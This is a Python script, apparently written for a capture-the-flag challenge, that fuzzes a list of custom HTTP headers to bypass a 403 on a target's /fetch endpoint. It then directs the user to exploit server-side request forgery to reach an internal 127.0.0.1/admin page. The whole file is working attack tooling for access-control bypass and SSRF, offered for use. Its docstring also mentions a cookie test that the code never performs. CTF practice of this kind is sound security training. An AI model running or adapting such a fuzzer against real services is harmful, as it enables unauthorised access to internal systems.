import requests

def find_ssrf_access_header(url):
    """
    Tests a list of highly probable custom HTTP headers and a specific cookie
    to find the one that grants access to the SSRF endpoint by bypassing the
    403 Forbidden response.
    """
    print(f"[*] Starting access bypass fuzzing against: {url}")

    # List of highly probable custom headers for internal/CTF access bypass
    possible_headers = [
        # --- Core SSRF & Auth Bypass Headers ---
        "X-SSRF-Access",
        "SSRF-Access",
        "X-SSRF-Auth",
        "SSRF-Auth",
        "X-Allow-SSRF",
        "Allow-SSRF",
        "Enable-SSRF",
        "X-Enable-SSRF",
        "X-Internal-SSRF",
        "Internal-SSRF",
        "X-Access-Allowed",
        "Access-Allowed",
        "X-Bypass",
        "Bypass-Security",
        "X-Security-Override",
        "Security-Override",
        "X-Challenge-Bypass",
        "Allow"
    ]

    # The required value based on the robots.txt hint
    required_value = 'true'
    found_bypasses = []

    # We use a 403 status code as the failure indicator
    EXPECTED_FAILURE_CODE = 403

    # Set up generic headers for testing
    generic_headers = {'User-Agent': 'CTF-Header-Fuzzer/1.0'}

    # --- 1. Test standard headers ---
    for header_name in possible_headers:
        # Construct the headers dictionary for the request
        test_headers = generic_headers.copy()
        test_headers[header_name] = required_value

        print(f"[*] Testing Header: {header_name} -> {required_value}...", end=" ")

        try:
            # Using GET for the initial check, as it's less likely to trigger rate limits
            response = requests.get(url, headers=test_headers, timeout=5)
            status_code = response.status_code
            print(f"Status: {status_code}")

            if status_code != EXPECTED_FAILURE_CODE:
                found_bypasses.append({
                    "type": "Header",
                    "name": header_name,
                    "value": required_value,
                    "status": status_code,
                    "preview": response.text[:50].replace('\n', ' ')
                })
                print(f"[!!! SUCCESS !!!] Header: {header_name} changed the response!")

        except requests.exceptions.RequestException as e:
            print(f"Error connecting: {e}")

    print("\n--- Fuzzing Complete ---")
    if found_bypasses:
        print("[+] Potential Access Bypass(es) Found:")
        for bypass in found_bypasses:
            print(f"    - Type: {bypass['type']} | Name: {bypass['name']}: {bypass['value']} | Status: {bypass['status']} | Preview: '{bypass['preview']}...'")
        print("\nUse the successful method (Header or Cookie) along with the 'url' parameter in a POST request to access http://127.0.0.1/admin.")
    else:
        print("[-] No success. The required bypass might be non-standard or missing from the list.")

if __name__ == "__main__":
    TARGET_URL = "https://wormhole.sunshinectf.games/fetch"
    find_ssrf_access_header(TARGET_URL)